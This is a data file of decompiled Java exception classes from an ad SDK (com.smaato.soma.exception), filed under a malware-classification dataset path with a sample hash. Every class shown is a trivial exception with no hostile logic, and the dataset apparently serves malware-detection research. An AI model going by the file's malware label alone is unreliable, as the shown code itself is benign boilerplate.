"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ModifyingAutoReloadStateFailed.code","public class ModifyingAutoReloadStateFailed extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ModifyingGPSLocationFailed.code","public class ModifyingGPSLocationFailed extends Exception {   private static final long serialVersionUID=1;   public ModifyingGPSLocationFailed(){   }   public ModifyingGPSLocationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ModifyingLoadingStateFailedException.code","public class ModifyingLoadingStateFailedException extends Exception {   private static final long serialVersionUID=1;   public ModifyingLoadingStateFailedException(){   }   public ModifyingLoadingStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ModifyingLocationStateFailed.code","public class ModifyingLocationStateFailed extends Exception {   private static final long serialVersionUID=1;   public ModifyingLocationStateFailed(){   }   public ModifyingLocationStateFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\NotifyingSizeChangedFailed.code","public class NotifyingSizeChangedFailed extends Exception {   private static final long serialVersionUID=1;   public NotifyingSizeChangedFailed(){   }   public NotifyingSizeChangedFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ODINFailedToProvideODIN1.code","public class ODINFailedToProvideODIN1 extends Exception {   private static final long serialVersionUID=1;   public ODINFailedToProvideODIN1(){   }   public ODINFailedToProvideODIN1(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OnReceiveAdFailedException.code","public class OnReceiveAdFailedException extends AdReceiveFailed {   private static final long serialVersionUID=1;   public OnReceiveAdFailedException(){   }   public OnReceiveAdFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OpeningLandingPageFailed.code","public class OpeningLandingPageFailed extends Exception {   private static final long serialVersionUID=1;   public OpeningLandingPageFailed(){   }   public OpeningLandingPageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OptimalHeightCalculationFailed.code","public class OptimalHeightCalculationFailed extends Exception {   private static final long serialVersionUID=1;   public OptimalHeightCalculationFailed(){   }   public OptimalHeightCalculationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OrmmaConnectorInitialisationFailed.code","public class OrmmaConnectorInitialisationFailed extends Exception {   private static final long serialVersionUID=1;   public OrmmaConnectorInitialisationFailed(){   }   public OrmmaConnectorInitialisationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OrmmaConnectorInstantiationFailed.code","public class OrmmaConnectorInstantiationFailed extends Exception {   private static final long serialVersionUID=1;   public OrmmaConnectorInstantiationFailed(){   }   public OrmmaConnectorInstantiationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\OsNameFailedException.code","public class OsNameFailedException extends Exception {   private static final long serialVersionUID=1;   public OsNameFailedException(){   }   public OsNameFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\PageRedirectionFailed.code","public class PageRedirectionFailed extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ParserException.code","public class ParserException extends Exception {   private static final long serialVersionUID=3661578789132233012L;   public String a;   public ErrorCode b;   public ParserException(  String str,  ErrorCode errorCode){     this.a="""";     this.b=ErrorCode.NO_ERROR;     this.a=str;     this.b=errorCode;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\PixelToDpFailed.code","public class PixelToDpFailed extends Exception {   public PixelToDpFailed(){   }   public PixelToDpFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ReceivedBannerParsingFailed.code","public class ReceivedBannerParsingFailed extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RegisterClickFailed.code","public class RegisterClickFailed extends Exception {   public RegisterClickFailed(){   }   public RegisterClickFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RequestBuilderInitialisationFailed.code","public class RequestBuilderInitialisationFailed extends Exception {   private static final long serialVersionUID=1;   public RequestBuilderInitialisationFailed(){   }   public RequestBuilderInitialisationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RequestingActivityFeaturesFailed.code","public class RequestingActivityFeaturesFailed extends Exception {   public RequestingActivityFeaturesFailed(){   }   public RequestingActivityFeaturesFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RequestingBannerFailed.code","public class RequestingBannerFailed extends Exception {   private static final long serialVersionUID=1;   public RequestingBannerFailed(){   }   public RequestingBannerFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RequestLimiterFailed.code","public class RequestLimiterFailed extends Exception {   public RequestLimiterFailed(){   }   public RequestLimiterFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RequestTimeFrameCalculationFailed.code","public class RequestTimeFrameCalculationFailed extends Exception {   public RequestTimeFrameCalculationFailed(){   }   public RequestTimeFrameCalculationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingAndroidIdFailed.code","public class RetrievingAndroidIdFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingAndroidIdFailed(){   }   public RetrievingAndroidIdFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingConnectionTypeFailed.code","public class RetrievingConnectionTypeFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingConnectionTypeFailed(){   }   public RetrievingConnectionTypeFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingDeviceBrandFailed.code","public class RetrievingDeviceBrandFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingDeviceBrandFailed(){   }   public RetrievingDeviceBrandFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingDeviceModelFailed.code","public class RetrievingDeviceModelFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingDeviceModelFailed(){   }   public RetrievingDeviceModelFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingDeviceOrientationFailed.code","public class RetrievingDeviceOrientationFailed extends Exception {   public RetrievingDeviceOrientationFailed(){   }   public RetrievingDeviceOrientationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingImeiFailed.code","public class RetrievingImeiFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingImeiFailed(){   }   public RetrievingImeiFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingLocationFailed.code","public class RetrievingLocationFailed extends Exception {   public RetrievingLocationFailed(){   }   public RetrievingLocationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingODIN1Failed.code","public class RetrievingODIN1Failed extends Exception {   private static final long serialVersionUID=1;   public RetrievingODIN1Failed(){   }   public RetrievingODIN1Failed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingReleaseVersionFailed.code","public class RetrievingReleaseVersionFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingReleaseVersionFailed(){   }   public RetrievingReleaseVersionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\RetrievingSDKVersionFailed.code","public class RetrievingSDKVersionFailed extends Exception {   private static final long serialVersionUID=1;   public RetrievingSDKVersionFailed(){   }   public RetrievingSDKVersionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\SettingProgressFailed.code","public class SettingProgressFailed extends Exception {   public SettingProgressFailed(){   }   public SettingProgressFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\SettingToasterToGoneFailed.code","public class SettingToasterToGoneFailed extends Exception {   public SettingToasterToGoneFailed(){   }   public SettingToasterToGoneFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\SettingToasterToVisibleFailed.code","public class SettingToasterToVisibleFailed extends Exception {   public SettingToasterToVisibleFailed(){   }   public SettingToasterToVisibleFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ShowProgressBarFailed.code","public class ShowProgressBarFailed extends Exception {   public ShowProgressBarFailed(){   }   public ShowProgressBarFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ShrinkAnimationFailed.code","public class ShrinkAnimationFailed extends Exception {   private static final long serialVersionUID=1;   public ShrinkAnimationFailed(){   }   public ShrinkAnimationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StartingVideoFailed.code","public class StartingVideoFailed extends Exception {   private static final long serialVersionUID=1;   public StartingVideoFailed(){   }   public StartingVideoFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StartingVideoFailedException.code","public class StartingVideoFailedException extends Exception {   private static final long serialVersionUID=1;   public StartingVideoFailedException(){   }   public StartingVideoFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateBlockedEnteredFailedException.code","public class StateBlockedEnteredFailedException extends Exception {   private static final long serialVersionUID=1;   public StateBlockedEnteredFailedException(){   }   public StateBlockedEnteredFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateBlockedExitFailedException.code","public class StateBlockedExitFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateFinishedLoadingFailedException.code","public class StateFinishedLoadingFailedException extends Exception {   private static final long serialVersionUID=1;   public StateFinishedLoadingFailedException(){   }   public StateFinishedLoadingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateIdleEnteredException.code","public class StateIdleEnteredException extends Exception {   private static final long serialVersionUID=1;   public StateIdleEnteredException(){   }   public StateIdleEnteredException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateIdleExitFailedException.code","public class StateIdleExitFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateXMLLoadingEnteredFailedException.code","public class StateXMLLoadingEnteredFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\StateXMLLoadingExitFailedException.code","public class StateXMLLoadingExitFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ToasterBannerInitFailed.code","public class ToasterBannerInitFailed extends Exception {   private static final long serialVersionUID=1;   public ToasterBannerInitFailed(){   }   public ToasterBannerInitFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionBlockLoadingFailedException.code","public class TransitionBlockLoadingFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionCloseNoOrmmaFailedException.code","public class TransitionCloseNoOrmmaFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionCloseNoOrmmaFailedException(){   }   public TransitionCloseNoOrmmaFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionClosingOrmmaFailedException.code","public class TransitionClosingOrmmaFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionClosingOrmmaFailedException(){   }   public TransitionClosingOrmmaFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionDisplayingBannerFailedException.code","public class TransitionDisplayingBannerFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionDisplayingBannerFailedException(){   }   public TransitionDisplayingBannerFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionErrorLoadingFailedException.code","public class TransitionErrorLoadingFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionExpandingBannerFailedException.code","public class TransitionExpandingBannerFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionExpandingBannerFailedException(){   }   public TransitionExpandingBannerFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionFinishLoadingFailedException.code","public class TransitionFinishLoadingFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionFinishLoadingFailedException(){   }   public TransitionFinishLoadingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionLoadBannerFailedException.code","public class TransitionLoadBannerFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionLoadingXmlFailedException.code","public class TransitionLoadingXmlFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionLoadingXmlFailedException(){   }   public TransitionLoadingXmlFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionLoadXMLFailedException.code","public class TransitionLoadXMLFailedException extends Exception {   private static final long serialVersionUID=1;   public TransitionLoadXMLFailedException(){   }   public TransitionLoadXMLFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TransitionUnblockLoadingFailedException.code","public class TransitionUnblockLoadingFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\TriggerBannerStateTransitionException.code","public class TriggerBannerStateTransitionException extends Exception {   private static final long serialVersionUID=1;   public TriggerBannerStateTransitionException(){   }   public TriggerBannerStateTransitionException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToAnimateCloseView.code","public class UnableToAnimateCloseView extends Exception {   private static final long serialVersionUID=1;   public UnableToAnimateCloseView(){   }   public UnableToAnimateCloseView(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToApplySDKSettings.code","public class UnableToApplySDKSettings extends Exception {   private static final long serialVersionUID=1;   public UnableToApplySDKSettings(){   }   public UnableToApplySDKSettings(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToCalculateMinimalHeight.code","public class UnableToCalculateMinimalHeight extends Exception {   public UnableToCalculateMinimalHeight(){   }   public UnableToCalculateMinimalHeight(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToConvertDataToHex.code","public class UnableToConvertDataToHex extends Exception {   public UnableToConvertDataToHex(){   }   public UnableToConvertDataToHex(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToEnterBannerStateExpanded.code","public class UnableToEnterBannerStateExpanded extends Exception {   private static final long serialVersionUID=1;   public UnableToEnterBannerStateExpanded(){   }   public UnableToEnterBannerStateExpanded(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToExitBannerStateDisplayed.code","public class UnableToExitBannerStateDisplayed extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToExitBannerStateExpanded.code","public class UnableToExitBannerStateExpanded extends Exception {   private static final long serialVersionUID=1;   public UnableToExitBannerStateExpanded(){   }   public UnableToExitBannerStateExpanded(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToExitEmptyState.code","public class UnableToExitEmptyState extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToFindAdDownloader.code","public class UnableToFindAdDownloader extends Exception {   private static final long serialVersionUID=1;   public UnableToFindAdDownloader(){   }   public UnableToFindAdDownloader(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToFindInterstitialBannerView.code","public class UnableToFindInterstitialBannerView extends Exception {   public UnableToFindInterstitialBannerView(){   }   public UnableToFindInterstitialBannerView(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToFindRootLayout.code","public class UnableToFindRootLayout extends Exception {   private static final long serialVersionUID=1;   public UnableToFindRootLayout(){   }   public UnableToFindRootLayout(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGenerateImageBanner.code","public class UnableToGenerateImageBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToGenerateImageBanner(){   }   public UnableToGenerateImageBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGenerateRichMediaBanner.code","public class UnableToGenerateRichMediaBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToGenerateRichMediaBanner(){   }   public UnableToGenerateRichMediaBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGenerateTextBanner.code","public class UnableToGenerateTextBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToGenerateTextBanner(){   }   public UnableToGenerateTextBanner(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetDeviceType.code","public class UnableToGetDeviceType extends Exception {   public UnableToGetDeviceType(){   }   public UnableToGetDeviceType(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetIsoDateFormat.code","public class UnableToGetIsoDateFormat extends Exception { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetScreenSize.code","public class UnableToGetScreenSize extends Exception {   private static final long serialVersionUID=1;   public UnableToGetScreenSize(){   }   public UnableToGetScreenSize(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetScreenWidth.code","public final class UnableToGetScreenWidth extends Exception {   private static final long serialVersionUID=1;   public UnableToGetScreenWidth(){   }   public UnableToGetScreenWidth(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetTheScreenHeight.code","public final class UnableToGetTheScreenHeight extends Exception {   private static final long serialVersionUID=1;   public UnableToGetTheScreenHeight(){   }   public UnableToGetTheScreenHeight(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToGetVideoView.code","public class UnableToGetVideoView extends Exception {   private static final long serialVersionUID=1;   public UnableToGetVideoView(){   }   public UnableToGetVideoView(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToInjectJavaScript.code","public class UnableToInjectJavaScript extends Exception {   private static final long serialVersionUID=1;   public UnableToInjectJavaScript(){   }   public UnableToInjectJavaScript(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToMakeAdRequestUrl.code","public class UnableToMakeAdRequestUrl extends Exception {   private static final long serialVersionUID=1;   public UnableToMakeAdRequestUrl(){   }   public UnableToMakeAdRequestUrl(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToNotifyAdListener.code","public class UnableToNotifyAdListener extends Exception {   private static final long serialVersionUID=1;   public UnableToNotifyAdListener(){   }   public UnableToNotifyAdListener(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToNotifyBannerIdle.code","public class UnableToNotifyBannerIdle extends Exception {   private static final long serialVersionUID=1;   public UnableToNotifyBannerIdle(){   }   public UnableToNotifyBannerIdle(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToNotifyBannerLoaded.code","public class UnableToNotifyBannerLoaded extends Exception {   private static final long serialVersionUID=1;   public UnableToNotifyBannerLoaded(){   }   public UnableToNotifyBannerLoaded(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToPauseAutoReload.code","public class UnableToPauseAutoReload extends Exception {   private static final long serialVersionUID=1;   public UnableToPauseAutoReload(){   }   public UnableToPauseAutoReload(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToResumeAutoReload.code","public class UnableToResumeAutoReload extends Exception {   private static final long serialVersionUID=1;   public UnableToResumeAutoReload(){   }   public UnableToResumeAutoReload(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToSendGooglePlayMessageToBannerView.code","public class UnableToSendGooglePlayMessageToBannerView extends Exception {   private static final long serialVersionUID=1;   public UnableToSendGooglePlayMessageToBannerView(){   }   public UnableToSendGooglePlayMessageToBannerView(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToSetBannerStateToEmpty.code","public class UnableToSetBannerStateToEmpty extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToShowCustomView.code","public class UnableToShowCustomView extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\UnableToTriggerTransitionCloseNoOrmmaBanner.code","public class UnableToTriggerTransitionCloseNoOrmmaBanner extends Exception {   private static final long serialVersionUID=1;   public UnableToTriggerTransitionCloseNoOrmmaBanner(){   }   public UnableToTriggerTransitionCloseNoOrmmaBanner(  Throwable th){     super(th);   } } "
